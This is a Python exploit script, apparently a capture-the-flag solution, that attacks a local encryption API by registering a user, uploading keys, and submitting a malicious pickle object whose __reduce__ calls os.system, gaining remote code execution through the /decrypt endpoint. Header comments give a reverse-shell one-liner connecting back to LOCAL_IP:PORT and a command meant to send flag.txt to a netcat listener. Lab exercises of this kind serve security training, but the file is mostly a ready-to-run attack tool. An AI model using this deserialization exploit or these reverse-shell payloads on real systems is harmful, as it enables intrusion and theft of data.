import requests
import argparse
import base64
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import sys
import pickle, os
from Crypto.Cipher import PKCS1_OAEP
from utils import print_colored
# To get a reverse shell and get the flag:
# python exp.py --action exploit --payload "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"LOCAL_IP\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
#
#
# or to get the flag directly:
# start a netcat listener
# `nc -lvnp PORT` 
# python exploit.py --action exploit --payload "sh -c 'cat flag.txt | LOCAL_IP PORT'"
#

API_BASE_URL = 'http://172.17.0.2:5000/apiv1'

def register(username, password):
    payload = {'username': username, 'password': password}
    response = requests.post(f'{API_BASE_URL}/register', json=payload)
    token = None  
    if response.status_code == 200:  
        token = response.json().get('token') 
        hashed = SHA256.new(password.encode()).hexdigest()
        print_colored(f'Registration successful using {username}:{password}\nSHA256: {hashed}\nToken: {token}\n\n', 'green')
        print(f"Full response = {response.json()}")
    else:
        print('Registration failed.')
        print(response.json())
    return token




def login(username, password, token):
    payload = {'username': username, 'password': password}
    headers = {'Authorization': token}
    response = requests.post(f'{API_BASE_URL}/login', json=payload, headers=headers)
    print(f"Sending to: {API_BASE_URL}/login\nusername={username}\ntoken={token}\n")
    if response.status_code == 200:
        token = response.json()['token']
        print_colored(f'Login successful. Token: {token}', 'bright_green')
    else:
        print_colored('Login failed.', 'red')

def upload_key(token, password, key_file=None, privkeyfile=None):
    if key_file is None:
        key_file = './public_key.pem'
    if privkeyfile is None:
        privkeyfile = './private_key.pem'
    print_colored(f"Uploading keys: {key_file} and {privkeyfile}...\n", "bright_yellow")
    with open(key_file, 'rb') as file:
        key_data = file.read()
    with open(privkeyfile, "rb") as f:
        data= f.read()
    
    priv_key_base64 = base64.urlsafe_b64encode(data).decode()
    key_base64 = base64.urlsafe_b64encode(key_data).decode()
    payload = {
        'public_key': key_base64,
        'private_key':priv_key_base64, 
        'password':password
        }
    headers = {'Authorization': token}
    print_colored(f"Uploading keys: {API_BASE_URL}/uploadkey...\nkey = {key_base64}\n", "bright_yellow")
    response = requests.post(f'{API_BASE_URL}/uploadkey', json=payload, headers=headers)
    
    if response.status_code == 200:

        print_colored('Key uploaded successfully.\n', 'bright_green')
        print(response.json())
    else:
        print(response.json())
        print_colored('\nKey upload failed.\n', 'red')

def encrypt( token,password, data, public_key=None):

    if public_key is None:
        public_key = './public_key.pem'
    print_colored(f"Initiating the encryption proces...Public Key file = {public_key}\n", "bright_yellow")
    with open(public_key, 'rb') as file:
        key_data = file.read()
    publicKey = base64.urlsafe_b64encode(key_data).decode()
    payload = {
        'data': data, 
        'public_key': publicKey, 
        'password':password
        }
    headers = {
        'Authorization': token
        }
    response = requests.post(f'{API_BASE_URL}/encrypt', json=payload, headers=headers)
    print_colored(f"Sending: {data} to be encrypted using token = {token}\n", "yellow")
    if response.status_code == 200:
        print_colored(f"Response = {response.content}", "bright_green")
        encrypted_data = response.json()['encrypted_data']
        print_colored(f'\nEncrypted data: {encrypted_data}', "magenta")
        return encrypted_data
    else:
        print_colored(response.content, "red")
        print_colored('Encryption failed.', 'red')


def decrypt(token, encrypted_data, password):
    payload = {
        'encrypted_data': encrypted_data, 
        'password':password
        }
    headers = {'Authorization': token}
    response = requests.post(f'{API_BASE_URL}/decrypt', json=payload, headers=headers)
    if response.status_code == 200:
        print(response.content)
        decrypted_data = response.json()['decrypted_data']
        print_colored(f'Decrypted data: {decrypted_data}', 'green')
    else:
        print(response.content)
        print_colored(response.json(), "bright_red")
        print_colored('Decryption failed.', "blue")

def generate_key(name):
    if name == None:
        name = 'RSA'
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    with open(f'{name}_private_key.pem', 'wb') as file:
        file.write(private_key)
    with open(f'{name}_public_key.pem', 'wb') as file:
        file.write(public_key)
    print('Key pair generated successfully.')




class exe(object):
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


import random, string
def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    print("Random string of length", length, "is:", result_str)
    return result_str

def exploit(payload):
    """This function demonstrates how to exploit the API using a reverse shell payload"""
    user = 'user123' + get_random_string(5)
    password = 'password1'
    public_key='./public_key.pem'
    private_key = './private_key.pem'
    # Register a new user
    tokenval = register(user, password)
    # Login as the new user
    login(user, password, tokenval)
    # Upload key pair
    upload_key(tokenval, password, public_key, private_key)

    
    # Craft the payload using pickle
    instance = exe(payload)
    malicious_data = pickle.dumps(instance)
    maliciousEncoded = base64.urlsafe_b64encode(malicious_data).decode()
    
    # Encrypt the payload
    headers = {'Authorization': tokenval}
    # payload
    exploit = encrypt(tokenval, password, maliciousEncoded, public_key=public_key)
    tmpdata = base64.urlsafe_b64encode(b'testing testing 123').decode()
    print_colored(f"Sending a test payload {tmpdata}", "bg_bright_magenta")
    # sending tmpdata for encryption
    exp = encrypt(tokenval, password, tmpdata, public_key=public_key)
    # This is where RCE occurs.
    dec = decrypt(tokenval, exp, password)
    print_colored(f"Sending the exploit payload {exploit}", "bg_bright_magenta")

    print_colored(f"\n\nEncrypted tmpdata {exp}", "bg_bright_magenta")
    print_colored(f"Encrypted Payload = {exploit}\n", "bg_bright_magenta")
    # Setup payload
    payload = {
        'encrypted_data': exploit,
        'password': password,
    }
    response = requests.post(f'{API_BASE_URL}/decrypt', json=payload, headers=headers)
    if response.status_code == 200:
        print_colored('Exploit executed successfully.', 'green')
        print(response.json())
    else:
        print(response.json())
        print_colored('\nExploit execution failed.\n', 'red')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='API Client')
    parser.add_argument('--action', choices=['register', 'login', 'upload-key', 'encrypt', 'decrypt', 'exploit', 'generate-key'], required=True, help='Action to perform')
    parser.add_argument('--pubkey',  help='Path to the public key file')
    parser.add_argument('--privkey',  help='Path to the private key file')
    parser.add_argument('--password', help='Password to use if required.')
    parser.add_argument('--username', help='Username to use if required.')
    parser.add_argument('--login', help='Login with a username')
    parser.add_argument('--plaintext', help='Plaintext data to Encrypt.')
    parser.add_argument('--ciphertext', help='Decrypt ciphertext data.')
    parser.add_argument('--payload',help='Exploit the API')
    parser.add_argument('--token', help='Authentication token to provide as a Header as Authorization: {token} if required.')
    parser.add_argument('--kp-name', help='Name of the keypair for generate-key action')

    args, unknown = parser.parse_known_args()
    if args.action in ['register', 'login']:
        if not args.username:
            parser.error('--username <username> --password <password> is required for this action.')
        if not args.password:
            parser.error('--username <username> --password <password> is required for this action.')
    
    if args.action in ['login', 'upload-key', 'encrypt', 'decrypt']:
        if not args.token:
            parser.error('--token is required for this action.')

    if args.action == 'upload-key':
        if not args.pubkey or not args.privkey:
            parser.error('--pubkey <file> --privkey <file> --token <token> --password <password> are required for this action.')
        else:
            upload_key(args.token, args.password, args.pubkey, args.privkey)

    if args.action == 'encrypt':
        if not args.plaintext or not args.pubkey:
            parser.error('--plaintext <plaintext> --pubkey <file> --password <password> --token <token> is required for this action.')
        else:
            encrypt(args.token, args.password, base64.urlsafe_b64encode(args.plaintext.encode()).decode(), args.pubkey)

    if args.action == 'decrypt':
        if not args.ciphertext:
            parser.error("--ciphertext <data> --password <password> --username <username> --token <token> is required for the decrypt action.")
        else:
            decrypt(args.token, args.ciphertext, args.password)
    if args.action == 'exploit':
        if not args.payload:
            parser.error("--payload <Reverse-shell-payload> is required for the exploit action.")
        else:
            exploit(args.payload)
            print_colored(f"Exploit function called using {args.payload}", 'yellow')
    if args.action == 'register':
        if not args.username or not args.password:
            print_colored("python3 exploit.py --username <username> --password <password> are required for the register action.", 'red')
            sys.exit(1)
        else:
            val = register(args.username, args.password)
            print_colored(f"Registration function called using {args.username}:{args.password}", 'yellow')

    if args.action == 'login':
        if not args.username or not args.password:
            print_colored("python3 exploit.py --token <token> --username <username> --password <password> are required for the login action.", 'red')
            sys.exit(1)
        else:
            login(args.username, args.password, args.token)
            print_colored(f"Login function called using {args.username}:{args.password}:{args.token}", 'yellow')

